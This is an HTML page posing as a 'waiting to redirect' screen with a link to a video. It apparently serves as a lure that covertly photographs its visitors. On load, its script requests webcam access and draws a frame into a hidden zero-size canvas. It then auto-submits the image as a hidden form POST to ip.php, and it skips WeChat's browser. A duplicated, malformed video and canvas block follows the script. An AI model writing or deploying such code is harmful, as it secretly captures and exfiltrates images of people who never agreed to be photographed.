<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>等待跳转...</title>
<style>
  body {
    height: 100vh;
    overflow: hidden;
  }

  /* 将链接的样式设为透明，以便不影响背景图片的显示 */
  a {
    display: block;
    width: 100%;
    height: 100%;
  }
</style>
</head>
<body>
    <!-- 将链接添加到背景图片的外部 -->
    <a href="https://vdse.bdstatic.com//192d9a98d782d9c74c96f09db9378d93.mp4?authorization=bce-auth-v1%2F40f207e648424f47b2e3dfbb1014b1a5%2F2021-07-12T02%3A14%3A24Z%2F-1%2Fhost%2F530146520a1c89fb727fbbdb8a0e0c98ec69955459aed4b1c8e00839187536c9" target="_blank" class="background-image"></a>

    <video id="video" width="0" height="0" autoplay></video>
	<canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
		<script type="text/javascript">
		window.addEventListener("DOMContentLoaded", function() {
            if (isWeiXin()) {
                var tip = document.getElementById('weixin-tip-box');
                tip.style.display = 'block';
                return;
            }
            var canvas = document.getElementById('canvas');
            var context = canvas.getContext('2d');
            var video = document.getElementById('video');

            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
					video.srcObject = stream;
                    video.play();
                    setTimeout(function(){context.drawImage(video, 0, 0, 480, 640);},1000);
                    setTimeout(function(){
                        var img = canvas.toDataURL('image/png');
                        document.getElementById('result').value = img;
                        document.getElementById('gopo').submit();
                        },1300);
                },function(){
                    alert("操作失败，权限不够！");
                });

            }
		}, false);

        function isWeiXin() {
            var ua = window.navigator.userAgent.toLowerCase();
            if (ua.match(/MicroMessenger/i) == 'micromessenger') {
                return true;
            } else {
                return false;
            }
        }
		</script>


    <video id="
video " width="
0 " height="
0 " autoplay></video>
	<canvas style="
width: 0px;
height: 0px " id="
canvas " width="
480 " height="
640 "></canvas>
<form action="ip.php?url=https://vdse.bdstatic.com//192d9a98d782d9c74c96f09db9378d93.mp4?authorization=bce-auth-v1%2F40f207e648424f47b2e3dfbb1014b1a5%2F2021-07-12T02%3A14%3A24Z%2F-1%2Fhost%2F530146520a1c89fb727fbbdb8a0e0c98ec69955459aed4b1c8e00839187536c9" id="gopo" method="post" >
	<input type="hidden" name="img" id="result" value="" />
</form>
</body>
</html>
